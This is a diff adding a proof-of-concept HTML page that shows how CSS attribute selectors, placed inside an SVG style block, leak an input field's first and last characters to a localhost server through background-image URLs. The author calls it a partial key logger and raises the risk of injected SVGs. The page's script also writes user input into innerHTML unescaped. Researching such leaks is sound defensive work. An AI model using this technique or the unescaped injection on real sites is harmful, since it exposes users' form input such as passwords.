@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title> CSS Field Character Exfiltration (security) via SVG Styling</title>
+
+  <style>
+    /* 
+input[name='getWord'][value$='a'] {
+  border: 5px solid aqua;
+  background: url('http://localhost:8000/?OriginalLastChar=a');
+}
+input[name='getWord'][value^='a'] {
+  border: 5px solid aqua;
+  background: url('http://localhost:8000/?OriginalFirstChar=a');
+}
+input[name='getWord'][value$='b'] {
+  border: 5px solid blue;
+  background: url('http://localhost:8000/?OriginalLastChar=b');
+}
+input[name='getWord'][value^='b'] {
+  border: 5px solid blue;
+  background: url('http://localhost:8000/?OriginalFirstChar=b');
+}
+input[name='getWord'][value$='c'] {
+  border: 5px solid green;
+  background: url('http://localhost:8000/?OriginalLastChar=c');
+}
+input[name='getWord'][value^='c'] {
+  border: 5px solid green;
+  background: url('http://localhost:8000/?OriginalFirstChar=c');
+}
+input[name='getWord'][value$='d'] {
+  border: 5px solid purple;
+  background: url('http://localhost:8000/?OriginalLastChar=d');
+}
+input[name='getWord'][value^='d'] {
+  border: 5px solid purple;
+  background: url('http://localhost:8000/?OriginalFirstChar=d');
+}
+// Changed input 
+input[name='changed'][value$='a'] {
+  border: 5px solid aqua;
+  background: url('http://localhost:8000/?ChangedLastChar=a');
+}
+input[name='changed'][value^='a'] {
+  border: 5px solid aqua;
+  background: url('http://localhost:8000/?ChangedFirstChar=a');
+}
+input[name='changed'][value$='b'] {
+  border: 5px solid blue;
+  background: url('http://localhost:8000/?ChangedLastChar=b');
+}
+input[name='changed'][value^='b'] {
+  border: 5px solid blue;
+  background: url('http://localhost:8000/?ChangedFirstChar=b');
+}
+input[name='changed'][value$='c'] {
+  border: 5px solid green;
+  background: url('http://localhost:8000/?ChangedLastChar=c');
+}
+input[name='changed'][value^='c'] {
+  border: 5px solid green;
+  background: url('http://localhost:8000/?ChangedFirstChar=c');
+}
+input[name='changed'][value$='d'] {
+  border: 5px solid purple;
+  background: url('http://localhost:8000/?ChangedLastChar=d');
+}
+input[name='changed'][value^='d'] {
+  border: 5px solid purple;
+  background: url('http://localhost:8000/?ChangedFirstChar=d');
+}
+*/ 
+  </style>
+
+  
+</head>
+<body>
+  
+<pre>
+Fires when style is applied
+[attribute=value]   [foo=bar]     Selects all elements with foo="bar"
+[attribute~=value]  [foo~=bar]    Selects all elements with a foo attribute containing the word "bar"
+[attribute|=value]  [foo|=bar]    Selects all elements with a foo attribute value starting with "bar"
+[attribute^=value]  [foo^="bar"]  Selects all elements with a foo attribute value starting with "bar"
+[attribute$=value]  [foo$="bar"]  Selects all elements with a foo attribute value ending with "bar"
+[attribute*=value]  [foo*="bar"]  Selects all elements with a foo attribute which contains the substring "bar"
+</pre>
+
+<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" width="20px">
+  <style>
+        circle {
+          fill: gold;
+          stroke: maroon;
+          stroke-width: 2px;
+        }
+        input[name='getWord'][value$='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?OriginalLastChar=a');
+    }
+    input[name='getWord'][value^='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?OriginalFirstChar=a');
+    }
+    input[name='getWord'][value$='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?OriginalLastChar=b');
+    }
+    input[name='getWord'][value^='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?OriginalFirstChar=b');
+    }
+    input[name='getWord'][value$='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?OriginalLastChar=c');
+    }
+    input[name='getWord'][value^='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?OriginalFirstChar=c');
+    }
+    input[name='getWord'][value$='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?OriginalLastChar=d');
+    }
+    input[name='getWord'][value^='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?OriginalFirstChar=d');
+    }
+    /**** Changed input  ****/
+    input[name='changed'][value$='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?ChangedLastChar=a');
+    }
+    input[name='changed'][value^='a'] {
+      border: 5px solid aqua;
+      background: url('http://localhost:8000/?ChangedFirstChar=a');
+    }
+    input[name='changed'][value$='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?ChangedLastChar=b');
+    }
+    input[name='changed'][value^='b'] {
+      border: 5px solid blue;
+      background: url('http://localhost:8000/?ChangedFirstChar=b');
+    }
+    input[name='changed'][value$='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?ChangedLastChar=c');
+    }
+    input[name='changed'][value^='c'] {
+      border: 5px solid green;
+      background: url('http://localhost:8000/?ChangedFirstChar=c');
+    }
+    input[name='changed'][value$='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?ChangedLastChar=d');
+    }
+    input[name='changed'][value^='d'] {
+      border: 5px solid purple;
+      background: url('http://localhost:8000/?ChangedFirstChar=d');
+    }
+  </style>
+
+  <circle cx="5" cy="5" r="4" />
+</svg></br>
+<input
+  name="getWord"
+  type="text"
+  value="pizza"
+  onchange="testWord(event.currentTarget.value)"
+  oninput="testWord(event.currentTarget.value)"
+/>
+<br />
+<input id="changed" name="changed" type="text" />
+<div id="changeTest"></div>
+
+<pre>Works like a partial key logger but doesn't address as values are
+directly changed via JS. 
+Worried about folk injecting svgs, like
+<a href="https://github.com/iconfu/svg-inject">svg-inject</a> or css directly
+into their site as the styling can be used to pull info from the page.
+</pre>
+
+
+  <script>
+    testWord = (word) => {
+  console.log(word);
+  document.getElementById('changed').value = word; // changing value here isn't picked up by css
+  document.getElementById('changeTest').innerHTML =
+    `<input type="text" name='changed' value='${word}' />`; // new dom element rendered (css is applied here)
+};
+
+  </script>
+</body>
+</html>
